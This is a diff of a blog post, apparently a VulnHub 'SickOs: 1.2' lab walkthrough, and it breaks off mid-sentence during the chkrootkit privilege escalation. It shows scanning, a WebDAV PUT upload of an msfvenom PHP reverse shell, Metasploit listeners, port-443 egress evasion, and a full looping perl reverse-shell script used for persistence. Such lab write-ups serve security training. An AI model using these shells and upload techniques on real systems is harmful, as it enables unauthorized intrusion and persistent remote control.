@@ -1,12 +1,723 @@
 ---
 layout: post
-title:  "SickOs: 1.2"
-date:   2019-04-15 00:34:01 +0000
+title: "SickOs: 1.2"
+date: 2019-04-15 00:34:01 +0000
 author: Larry Brown
 category: Walkthroughs
 tags: [vulnhub]
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-04-15 00:34:01 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-04-29 16:55:43 +0000" name="updated"/><title>SickOs: 1.2</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/sickos-12,144/" target="_blank">https://www.vulnhub.com/entry/sickos-12,144/</a></div><div>Hostname: ubuntu</div><div>IP Address: 10.183.0.196</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.196.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# nmap -Pn -sT -sV -A -oA sickos12 -p 1-65535 10.183.0.196</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 13:44 EDT</div><div>Nmap scan report for ubuntu.homenet.dom (10.183.0.196)</div><div>Host is up (0.0041s latency).</div><div>Not shown: 65533 filtered ports</div><div>PORT   STATE SERVICE VERSION</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp open  ssh     </font><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 5.9p1</font><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</font></div><div>| ssh-hostkey:</div><div>|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)</div><div>|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)</div><div>|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp open  http    lighttpd 1.4.28</font></div><div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">lighttpd/1.4.28</font></div><div>|_http-title: Site doesn't have a title (text/html).</div><div>MAC Address: 08:00:27:D8:A3:27 (Oracle VirtualBox virtual NIC)</div><div>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div><div>Device type: general purpose</div><div>Running: Linux 3.X|4.X</div><div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div><div>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</div><div>Network Distance: 1 hop</div><div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div><div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   4.09 ms ubuntu.homenet.dom (10.183.0.196)</div><div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 117.22 seconds</div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>The nmap scan returned the following software versions.</div><ul><li><div>OpenSSH 5.9p1 - primarily issues with username enumeration</div></li><li><div>lighttpd/1.4.28 - no applicable vulnerabilities</div></li></ul><div><br/></div><div>I'm going to start by looking at the HTTP service on TCP port 80. Before actually browsing to the site, though, I'm going to scan the service with nikto.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# nikto -h http://10.183.0.196</div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.196</div><div>+ Target Hostname:    10.183.0.196</div><div>+ Target Port:        80</div><div>+ Start Time:         2019-04-22 14:06:55 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">lighttpd/1.4.28</font></div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ All CGI directories 'found', use '-C none' to test none</div><div>+ Retrieved x-powered-by header:<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;"> PHP/5.3.10-1ubuntu3.21</font></div><div>+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host</div><div>+ End Time:           2019-04-22 14:08:43 (GMT-4) (108 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div>Nikto finds surprising little. Guess I'll have to browse to the site to see what's going on.</div><div><br/></div><div>The default site is equally useless. It only returns an image and a comment that says "NOTHING IN HERE".</div><div><br/></div><div>Let's see if there are any interesting <a href="https://www.owasp.org/index.php/Test_HTTP_Methods_(OTG-CONFIG-006)" target="_blank">HTTP methods</a> supported. We can try to get the methods using curl...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl -sIX OPTIONS --url http://10.183.0.196</div><div>HTTP/1.1 200 OK</div><div>X-Powered-By: PHP/5.3.10-1ubuntu3.21</div><div>Content-type: text/html</div><div>Transfer-Encoding: chunked</div><div>Date: Mon, 22 Apr 2019 21:08:36 GMT</div><div>Server: lighttpd/1.4.28</div></div><div><br/></div><div>As well as nmap...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# nmap -p 80 --script http-methods 10.183.0.196</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 17:14 EDT</div><div>Nmap scan report for ubuntu.homenet.dom (10.183.0.196)</div><div>Host is up (0.0016s latency).</div><div><div><br/></div></div><div>PORT   STATE SERVICE</div><div>80/tcp open  http</div><div>| http-methods: </div><div>|_  Supported Methods: GET HEAD POST OPTIONS</div><div>MAC Address: 08:00:27:D8:A3:27 (Oracle VirtualBox virtual NIC)</div><div><div><br/></div></div><div>Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</div></div><div><br/></div><div>Curl doesn't return anything interesting, and nmap just gives us the standard fare.</div><div><br/></div><div>Time to start brute forcing directories to see if we can find anything. Using wfuzz, I'm able to find two additional locations. One is listable, but empty (/test/). The other is "Forbidden" (/~sys~)... but a request to any directory ending in a tilde (~) returns 403 Forbidden... so that's not helpful.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# wfuzz -z file,/usr/share/dirb/wordlists/big.txt -t 30 --hc 404 http://10.183.0.196/FUZZ</div><div><div><br/></div></div><div>Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</div><div><div><br/></div></div><div>********************************************************</div><div>* Wfuzz 2.3.4 - The Web Fuzzer                         *</div><div>********************************************************</div><div><div><br/></div></div><div>Target: http://10.183.0.196/FUZZ</div><div>Total requests: 20469</div><div><div><br/></div></div><div>==================================================================</div><div>ID   Response   Lines      Word         Chars          Payload    </div><div>==================================================================</div><div><div><br/></div></div><div>017880:  C=301      0 L        0 W            0 Ch        "test"</div><div>020464:  C=403     11 L       26 W          345 Ch        "~sys~"</div><div><div><br/></div></div><div>Total time: 26.72272</div><div>Processed Requests: 20469</div><div>Filtered Requests: 20467</div><div>Requests/sec.: 765.9772</div></div><div><br/></div><div>The test directory is empty, but let's see if it supports any interesting HTTP methods.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl -sIX OPTIONS --url http://10.183.0.196/test/</div><div>HTTP/1.1 200 OK</div><div>DAV: 1,2</div><div>MS-Author-Via: DAV</div><div>Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK</div><div>Allow: OPTIONS, GET, HEAD, POST</div><div>Content-Length: 0</div><div>Date: Mon, 22 Apr 2019 21:18:11 GMT</div><div>Server: lighttpd/1.4.28</div></div><div><br/></div><div>Ah. Now we are getting somewhere. It looks like the test directory has Web Distributed Authoring and Versioning (WebDAV) enabled. Let's see if we can upload a PHP reverse shell using the PUT method.</div><div><br/></div><div>First, we'll create our PHP reverse shell using msfvenom.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=5432 -f raw &gt; rev.php</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>No encoder or badchars specified, outputting raw payload</div><div>Payload size: 3033 bytes</div></div><div><br/></div><div>Now, we'll use curl to try to upload the file.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl -T rev.php --url http://10.183.0.196/test/rev.php</div><div>&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</div><div>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"</div><div>         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</div><div>&lt;html xml:lang="en" lang="en"&gt;</div><div> &lt;head&gt;</div><div>  &lt;title&gt;417 - Expectation Failed&lt;/title&gt;</div><div> &lt;/head&gt;</div><div> &lt;body&gt;</div><div>  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt;</div><div> &lt;/body&gt;</div><div>&lt;/html&gt;</div></div><div><br/></div><div>Hmmm... we are getting a "417 - Expectation Failed" error. Googling this error, we see that we might need to set curl to use HTTP 1.0 with the -0 or --http1.0 option. Let's set that option and try again.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.php --url http://10.183.0.196/test/rev.php</div><div>* Expire in 0 ms for 6 (transfer 0x563df5706d00)</div><div>*   Trying 10.183.0.196...</div><div>* TCP_NODELAY set</div><div>* Expire in 200 ms for 4 (transfer 0x563df5706d00)</div><div>* Connected to 10.183.0.196 (10.183.0.196) port 80 (#0)</div><div>&gt; PUT /test/rev.php HTTP/1.0</div><div>&gt; Host: 10.183.0.196</div><div>&gt; User-Agent: curl/7.64.0</div><div>&gt; Accept: */*</div><div>&gt; Content-Length: 3033</div><div>&gt; </div><div>* We are completely uploaded and fine</div><div>* HTTP 1.0, assume close after body</div><div>&lt; HTTP/1.0 200 OK</div><div>&lt; Content-Length: 0</div><div>&lt; Connection: close</div><div>&lt; Date: Mon, 22 Apr 2019 21:43:32 GMT</div><div>&lt; Server: lighttpd/1.4.28</div><div>&lt; </div><div>* Closing connection 0</div></div><div><br/></div><div>No errors this time. Let's check the site.</div><div><br/></div><div><img height="280" src="/assets/images/2019-04-15-sickos-1.2/C11F7BF6-B25E-4806-AA6C-874DC1AC8851.png" width="1060"/><br/></div><div><br/></div><div>Nice! Before clicking on the rev.php file, let's fire up our listeners in Metasploit. I like to start two listeners because the PHP reverse shell doesn't typically stay up very long. Once it is up, I like to start a second shell using perl.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 0.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div><div>msf5 exploit(multi/handler) &gt; </div><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div><div>payload =&gt; generic/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div><div>LPORT =&gt; 5433</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 1.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5433</div></div><div><br/></div><div>Now let's request our PHP reverse shell using curl.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl --url http://10.183.0.196/test/rev.php</div></div><div><br/></div><div>Hmmm... That didn't seem to work... but why? It is possible the system has egress filtering and won't allow requests on just any port. Maybe if we try to have the reverse shell connect out on TCP port 80 or 443 (common web ports) it will work.</div><div><br/></div><div>Let's rebuild our PHP reverse shell using msfvenom. This time we'll have it try to connect back to us on TCP port 80.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=80 -f raw &gt; rev.php</div><div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div><div>[-] No arch selected, selecting arch: php from the payload</div><div>No encoder or badchars specified, outputting raw payload</div><div>Payload size: 2999 bytes</div></div><div><br/></div><div>We'll re-upload rev.php using curl...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.php --url http://10.183.0.196/test/rev.php</div><div>* Expire in 0 ms for 6 (transfer 0x55751dba7d00)</div><div>*   Trying 10.183.0.196...</div><div>* TCP_NODELAY set</div><div>* Expire in 200 ms for 4 (transfer 0x55751dba7d00)</div><div>* Connected to 10.183.0.196 (10.183.0.196) port 80 (#0)</div><div>&gt; PUT /test/rev.php HTTP/1.0</div><div>&gt; Host: 10.183.0.196</div><div>&gt; User-Agent: curl/7.64.0</div><div>&gt; Accept: */*</div><div>&gt; Content-Length: 2999</div><div>&gt; </div><div>* We are completely uploaded and fine</div><div>* HTTP 1.0, assume close after body</div><div>&lt; HTTP/1.0 200 OK</div><div>&lt; Content-Length: 0</div><div>&lt; Connection: close</div><div>&lt; Date: Mon, 22 Apr 2019 21:53:28 GMT</div><div>&lt; Server: lighttpd/1.4.28</div><div>&lt; </div><div>* Closing connection 0</div></div><div><br/></div><div>We need to stop our previous listeners in Metasploit and start new ones. Hopefully the target can make outbound requests to 80, 443, and maybe 53. I'll set up listeners for each and we'll try them all.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 53</div><div>LPORT =&gt; 53</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 5.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:53 </div><div>msf5 exploit(multi/handler) &gt; </div><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 80</div><div>LPORT =&gt; 80</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 6.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:80 </div><div>msf5 exploit(multi/handler) &gt; </div><div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload php/reverse_php</div><div>payload =&gt; php/reverse_php</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 443</div><div>LPORT =&gt; 443</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 7.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:443</div></div><div><br/></div><div>OK. All set up. Let's try that again.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl --url http://10.183.0.196/test/rev.php</div></div><div><br/></div><div>Bummer. TCP port 80 didn't work. Let's recreate our rev.php file using TCP port 443 and upload again.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=443 -f raw &gt; rev.php</div><div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.php --url http://10.183.0.196/test/rev.php</div><div>root@kali:~/Walkthroughs/sickos12# curl --url http://10.183.0.196/test/rev.php</div></div><div><br/></div><div>BINGO! That worked.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:443 -&gt; 10.183.0.196:55184) at 2019-04-22 17:58:13 -0400</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions 1</div><div>[*] Starting interaction with 1...</div><div><div><br/></div></div><div>pwd</div><div>/var/www/test</div><div>id</div><div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div></div><div><br/></div><div>Unfortunately, as stated before, the PHP reverse shell doesn't stay active very long. I'll need to set up a script to make a reverse shell connection back to my attacker on TCP port 443. Thankfully, I can write the script on my attacker system and transfer it to the victim using PUT.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# cat rev.sh </div><div>#!/bin/sh</div><div>while true; do</div><div>    perl -e 'use Socket;$i="10.183.0.222";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div><div>    # sleep for 300 seconds (5 mins)</div><div>    sleep 300</div><div>done</div><div>root@kali:~/Walkthroughs/sickos12# curl -v0T rev.sh --url http://10.183.0.196/test/rev.sh</div><div>* Expire in 0 ms for 6 (transfer 0x55d917b09d00)</div><div>*   Trying 10.183.0.196...</div><div>* TCP_NODELAY set</div><div>* Expire in 200 ms for 4 (transfer 0x55d917b09d00)</div><div>* Connected to 10.183.0.196 (10.183.0.196) port 80 (#0)</div><div>&gt; PUT /test/rev.sh HTTP/1.0</div><div>&gt; Host: 10.183.0.196</div><div>&gt; User-Agent: curl/7.64.0</div><div>&gt; Accept: */*</div><div>&gt; Content-Length: 308</div><div>&gt;</div><div>* We are completely uploaded and fine</div><div>* HTTP 1.0, assume close after body</div><div>&lt; HTTP/1.0 201 Created</div><div>&lt; Content-Length: 0</div><div>&lt; Connection: close</div><div>&lt; Date: Mon, 22 Apr 2019 22:09:41 GMT</div><div>&lt; Server: lighttpd/1.4.28</div><div>&lt;</div><div>* Closing connection 0</div></div><div><br/></div><div>Now, I just need to connect back to the PHP reverse shell session, set rev.sh as executable and run it in the background. Once it is running, I'll disconnect from the PHP reverse shell and start a listener for the perl reverse shell. It will take about 5 minutes to get back to me, but this will also handle my "Maintaining Access" step. 🙂</div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>See above.</div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>Once we have a stable connection to the victim, we check the operating system information using 'uname'.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@ubuntu:/$ uname -a</div><div>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux</div></div><div><br/></div><div>We also check the 'os-release' file in /etc.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@ubuntu:/etc$ cat os-release</div><div>NAME="Ubuntu"</div><div>VERSION="12.04.4 LTS, Precise Pangolin"</div><div>ID=ubuntu</div><div>ID_LIKE=debian</div><div>PRETTY_NAME="Ubuntu precise (12.04.4 LTS)"</div><div>VERSION_ID="12.04"</div></div><div><br/></div><div>Checking the exploit database, there is only one potential kernel exploit we can try.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Linux Kernel 3.11 &lt; 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation                   | exploits/linux/local/41995.c</div></div><div><br/></div><div>We will use our DAV service to transfer the C file to the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/sickos12# curl -v0T 41995.c --url http://10.183.0.196/test/41995.c</div></div><div><br/></div><div>Unfortunately, we can't get the exploit to compile on the victim or our attacking machine. Let's see what else we can find on the system.</div><div><br/></div><div>Looking through the cron jobs, I noticed there is a job for chkrootkit. Since I know some versions of this application are vulnerable to privilege escalation, I check the version.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>www-data@ubuntu:/etc/cron.daily$ chkrootkit -V</div><div>chkrootkit version 0.49</div></div><div><br/></div><div>We are in luck. This is a known vulnerable version.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Chkrootkit 0.49 - Local Privilege Escalation                                                                 | exploits/linux/local/33899.txt</div></div><div><br/></div><div>To take advantage of this vulnerability, we just need to create an executable file named '/tmp/update' with the commands we want root to run for us. Since getting outbound 